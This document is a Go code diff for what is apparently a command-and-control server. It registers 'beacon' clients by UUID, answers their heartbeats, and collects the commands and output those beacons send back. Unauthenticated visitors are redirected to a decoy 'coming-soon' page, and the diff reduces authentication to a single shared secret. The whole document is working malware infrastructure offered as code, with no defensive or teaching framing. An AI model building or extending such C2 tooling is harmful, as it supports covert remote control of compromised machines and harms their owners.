@@ -22,11 +22,13 @@ const (
 	endpointStatus        = "/status"
 	endpointComingSoon    = "/coming-soon"
 	endpointData          = "/data"
+	endpointRegister      = "/register"
 	endpointUUID          = "/{uuid}"
 	endpointHeartbeat     = "/heartbeat"
 	endpointHeartbeatUUID = endpointHeartbeat + endpointUUID
 	endpointReceive       = "/receive"
 	endpointReceiveUUID   = endpointReceive + endpointUUID
+	endpointFetchData     = "/fetch-data" + endpointUUID
 )
 
 // Start the API server
@@ -50,16 +52,45 @@ func StartAPIServer() {
 	})
 
 	// Authenticated endpoints
+	// r.HandleFunc(endpointRegister, AuthMiddleware(HandleClientRegistration))
+	// r.HandleFunc(endpointRegister, HandleClientRegistration)
 	r.HandleFunc(endpointHeartbeat, AuthMiddleware(HandleHeartBeat))
 	r.HandleFunc(endpointHeartbeatUUID, AuthMiddleware(HandleHeartBeatUUID))
 	r.HandleFunc(endpointReceive, AuthMiddleware(HandleReceive))
-	// http.HandleFunc(endpointReceiveUUID, AuthMiddleware(HandleReceiveUUID))
+	r.HandleFunc(endpointReceiveUUID, AuthMiddleware(HandleReceiveUUID))
+	r.HandleFunc(endpointFetchData, AuthMiddleware(HandleFetchData))
 
 	// Not used, but leaving here if I ever need to host a data.json file
 	// r.HandleFunc(endpointData, AuthMiddleware(HandleImportDataFile))
 
 	log.Println("Server running on port 8080...")
 	log.Fatal(http.ListenAndServe(":8080", r))
+}
+
+// // Register a beacon. Cool idea, don't recommend to automate
+// func HandleClientRegistration(w http.ResponseWriter, r *http.Request) {
+// 	clientUUID := uuid.New().String() // Generate a unique UUID
+// 	response := map[string]string{"ClientUUID": clientUUID}
+
+// 	log.Printf("New UUID: %s\n", clientUUID)
+// 	log.Printf("The response: %s\n", response)
+// 	w.Header().Set("Content-Type", "application/json")
+// 	json.NewEncoder(w).Encode(response)
+
+// 	log.Printf("[+] New client registered: %s", clientUUID)
+// }
+
+func HandleFetchData(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	uuid := vars["uuid"]
+
+	data, err := dbconnections.FetchClientData(uuid)
+	if err != nil {
+		http.Error(w, "Error retrieving data", http.StatusInternalServerError)
+		return
+	}
+
+	JsonResponse(w, data)
 }
 
 func HandleHeartBeat(w http.ResponseWriter, r *http.Request) {
@@ -72,17 +103,15 @@ func HandleHeartBeat(w http.ResponseWriter, r *http.Request) {
 
 	// Extract only the "status" field
 	status, ok := result["status"].(string)
-	// status, ok := result["command"].(string)
 	if !ok {
 		http.Error(w, "Invalid data format", http.StatusInternalServerError)
 		return
 	}
 
 	JsonResponse(w, map[string]string{"status": status})
-	// JsonResponse(w, map[string]string{"command": status})
-	// JsonResponse(w, []map[string]string{{"command": status}})
 }
 
+// Hearbeat specific to a UUID beacon
 func HandleHeartBeatUUID(w http.ResponseWriter, r *http.Request) {
 	// Ensure it's a GET request
 	if r.Method != http.MethodGet {
@@ -153,10 +182,32 @@ func HandleReceive(w http.ResponseWriter, r *http.Request) {
 	JsonResponse(w, map[string]string{"message": "Data received successfully"})
 }
 
-// // Authenticated endpointReceiveUUID POST details
-// func HandleReceiveUUID(w http.ResponseWriter, r *http.Request) {
+// Authenticated endpointReceiveUUID POST details
+// This needs to be saved in mongodb
+func HandleReceiveUUID(w http.ResponseWriter, r *http.Request) {
+	// Ensure it's a POST request
+	if r.Method != http.MethodPost {
+		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+		return
+	}
+	vars := mux.Vars(r)
+	clientUUID := vars["uuid"] // Extract from URL
 
-// }
+	var requestData struct {
+		Command string `json:"Command"`
+		Output  string `json:"Output"`
+	}
+
+	err := json.NewDecoder(r.Body).Decode(&requestData)
+	if err != nil {
+		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+		return
+	}
+
+	log.Printf("[+] Received response from %s | Command: %s | Output: %s", clientUUID, requestData.Command, requestData.Output)
+
+	w.WriteHeader(http.StatusOK)
+}
 
 // jsonResponse sends JSON data with the appropriate headers
 func JsonResponse(w http.ResponseWriter, data interface{}) {
@@ -182,12 +233,14 @@ func LoadJSONFromFile(filename string) ([]map[string]interface{}, error) {
 }
 
 // validateClientAuth checks if ClientId and Secret exist in MongoDB and are active
-func ValidateClientAuth(clientId, secret string) (bool, error) {
+// func ValidateClientAuth(clientId, secret string) (bool, error) {
+func ValidateClientAuth(secret string) (bool, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 
 	var clientAuth dbconnections.ClientAuth
-	filter := bson.M{"ClientId": clientId, "Secret": secret, "Active": true}
+	// filter := bson.M{"ClientId": clientId, "Secret": secret, "Active": true}
+	filter := bson.M{"Secret": secret, "Active": true}
 
 	err := dbconnections.ClientCollection.FindOne(ctx, filter).Decode(&clientAuth)
 	if err != nil {
@@ -201,10 +254,8 @@ func ValidateClientAuth(clientId, secret string) (bool, error) {
 // authMiddleware checks for ClientId & Secret in request headers and validates against MongoDB
 func AuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		clientId := r.Header.Get("X-Client-Id")
-		// log.Println(clientId)
 		clientSecret := r.Header.Get("X-API-Secret")
-		// log.Println(clientSecret)
+
 		clientIP := r.RemoteAddr
 		requestTime := time.Now().Format(time.RFC3339) // Logs timestamp in ISO format
 
@@ -214,16 +265,16 @@ func AuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
 		}
 
 		// Log the request details
-		log.Printf("[%s] Request from %s | ClientID: %s | Endpoint: %s\n", requestTime, clientIP, clientId, r.URL.Path)
+		log.Printf("[%s] Request from %s | Endpoint: %s\n", requestTime, clientIP, r.URL.Path)
 
-		if clientId == "" || clientSecret == "" {
+		if clientSecret == "" {
 			http.Redirect(w, r, endpointComingSoon, http.StatusTemporaryRedirect)
 			return
 		}
 
-		valid, err := ValidateClientAuth(clientId, clientSecret)
+		valid, err := ValidateClientAuth(clientSecret)
 		if err != nil || !valid {
-			log.Printf("[%s] Unauthorized request from %s | ClientID: %s\n", requestTime, clientIP, clientId)
+			log.Printf("[%s] Unauthorized request from %s\n", requestTime, clientIP)
 			http.Redirect(w, r, endpointComingSoon, http.StatusTemporaryRedirect)
 			return
 		}
